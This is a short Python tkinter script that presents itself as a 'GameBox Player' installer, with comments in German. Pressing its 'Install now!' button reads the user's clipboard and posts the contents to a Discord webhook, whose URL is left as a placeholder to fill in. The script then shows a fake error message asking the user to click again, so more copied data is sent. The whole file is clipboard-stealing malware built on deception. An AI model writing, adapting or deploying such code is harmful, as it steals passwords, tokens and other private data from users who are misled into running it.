import tkinter as tk
from tkinter import messagebox
import requests
import pyperclip

# Discord Webhook URL
WEBHOOK_URL = "YOUR WEBHOOK URL HERE!"

# Tkinter vorbereiten
root = tk.Tk()
root.withdraw()  # Hauptfenster ausblenden für den Start

# Sicherheitsabfrage anzeigen
confirm = messagebox.askyesno(
    "Warnung",
    "GameBox Player wird installiert aber du musst den ToS zustimmen. Wo du die findest? Hier: https://bit.ly/notanrickroll"
)

if confirm:
    root.deiconify()  # Hauptfenster wieder sichtbar machen
    root.title("GameBox Installer")
    root.geometry("300x120")

    def send_clipboard():
        content = pyperclip.paste()
        if content:
            data = {
                "content": f"📋 **Clipboard:**\n```{content}```"
            }
            response = requests.post(WEBHOOK_URL, json=data)
            if response.status_code == 204:
                messagebox.showinfo("Erfolg", "Error occurred! Please click again on the Button!")
            else:
                messagebox.showerror("Fehler", f"Error occurred: {response.status_code}")
        else:
            messagebox.showwarning("Leer", "Error occurred! Please click again on the Button!")

    # GUI aufbauen
    tk.Label(root, text="Run installer.", font=("Arial", 13)).pack(pady=10)
    tk.Button(root, text="Install now!", command=send_clipboard).pack(pady=10)

    root.mainloop()
else:
    print("No Installation!")
    root.destroy()
